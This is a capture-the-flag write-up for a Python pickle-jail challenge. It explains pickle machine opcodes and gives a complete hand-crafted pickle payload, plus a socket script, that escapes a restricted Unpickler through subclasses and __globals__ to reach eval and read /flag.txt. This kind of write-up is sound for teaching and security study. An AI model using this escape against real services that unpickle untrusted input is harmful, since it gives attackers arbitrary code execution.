Source code  
```  
#!/usr/local/bin/python3

import pickle  
import io  
import sys

module = type(__builtins__)  
empty = module("empty")  
empty.empty = empty  
sys.modules["empty"] = empty

class SafeUnpickler(pickle.Unpickler):  
   def find_class(self, module, name):  
       if module == "empty" and name.count(".") <= 1:  
           return super().find_class(module, name)  
       raise pickle.UnpicklingError("e-legal")

lepickle = bytes.fromhex(input("Enter hex-encoded pickle: "))  
if len(lepickle) > 400:  
   print("your pickle is too large for my taste >:(")  
else:  
   SafeUnpickler(io.BytesIO(lepickle)).load()  
```  
So we have patched Unpickler preteding to be safe. In order to crack this, we
need to understand how it works (obviously). Basically pickle use Pickle
Machine to extract data, and input data is a program for this machine. So we
need to understand which commands supports Pickle Machine. Full list of
commands and clear explanation what they do we can find in [source
code](https://github.com/python/cpython/blob/main/Lib/pickle.py#L111) (code
never lies). For our purpose we need some subset of commands:  
1. Identify pickle protocol. Byte code \x80. We set it on version 4, full command \x80\x04  
2. V -- push string literal on stack top.  
3. ( -- mark position on stack  
4. \x93 -- push self.find_class(modname, name) (method which overload in source code of task). Modname and name pops from stack.  
5. t -- make tuple starting from top of stack to marked position, which defines by '(' command  
6. R -- call function. Pseudocode of command:   
```  
args = stack.pop()  
func = stack.pop()  
stack.push(func(*args))  
```  
7-8. Two commands to put ('p') and get ('g') object from memo (imagine it like
global dict, which accessable from any point of pickle-program). Use it like
this:  
```Vsome_string\np0\nVanother_string\ng0\n```.  Now on top of stack has string
"some_string".

If command has arguments, arguments must be separated by new line symbol
('\n').  
Now we can start build our pickle-program, but we have two problems. Only
module "empty" (which has no properties) is accessably to us. And second
dificulty is we can not use more than one dot in argument "name" of method
```find_class(self, module, name)```  
Empty module not so scare because we know pyjail escape technique like this

```empty.__class__.__base__.__subclasses__()[100].__init__.__globals__['__builtins__']['eval']('print(open("/flag.txt").read())')```

But what we can do about second trouble? We can load parts of our attack
vector into "empty" module, saving interim steps. For that we need callable,
which do job. We can take it by load ```empty.__setattr__``` method on stack
(and save it in memo). Another thing, we strongly need, is ```getattr```
method. But it is function from ```__builtins__``` module. But same
functionality we can find in method ```object.__getattribute__```. So now we
have all piecies of pazzle on the table, let build solution.

```  
import socket

# functional equivalent  
# g0 = empty.__class__.__base__  
# g1 = empty.__setattr__  
# g1('obj', g0)  
# g2 = empty.obj.__getattribute__  
# g1('sc', empty.obj.__subclasses__())  
# g3 = empty.sc.__getitem__  
# g1('i', g2(g3(100), '__init__'))  # empty.i = obj.subclasses()[100].__init__  
# g1('gl', empty.i.__globals__)  
# g4 = empty.gl.__getitem__  
# g1('b', g4('__builtins__'))  # empty.b = empty.i.__globals__['__builtins__']  
# g5 = empty.b.__getitem__  
# g1('e', g5('eval'))  # empty.e = empty.b['eval']  
# empty.e('print(open("flag.txt").read())')

lepickle = b'\x80\x04' \  
          b'Vempty\nV__class__.__base__\n\x93p0\n' \  
          b'(Vempty\nV__setattr__\n\x93p1\n' \  
          b'g1\n(Vobj\ng0\ntR' \  
          b'Vempty\nVobj.__getattribute__\n\x93p2\n' \  
          b'g1\n(Vsc\nVempty\nVobj.__subclasses__\n\x93)RtR' \  
          b'Vempty\nVsc.__getitem__\n\x93p3\n' \  
          b'g1\n(Vi\ng2\n(g3\n(I100\ntRV__init__\ntRtR' \  
          b'g1\n(Vgl\nVempty\nVi.__globals__\n\x93tR' \  
          b'Vempty\nVgl.__getitem__\n\x93p4\n' \  
          b'g1\n(Vb\ng4\n(V__builtins__\ntRtR' \  
          b'Vempty\nVb.__getitem__\n\x93p5\n' \  
          b'g1\n(Ve\ng5\n(Veval\ntRtR' \  
          b'Vempty\nVe\n\x93(Vprint(open("/flag.txt").read())\ntR.'

sock = socket.socket()  
sock.connect(('challs.actf.co', 31332))  
sock.recv(1000)  
sock.send(lepickle.hex().encode('utf-8') + b'\n')  
print(sock.recv(1000).decode('utf-8'))  
```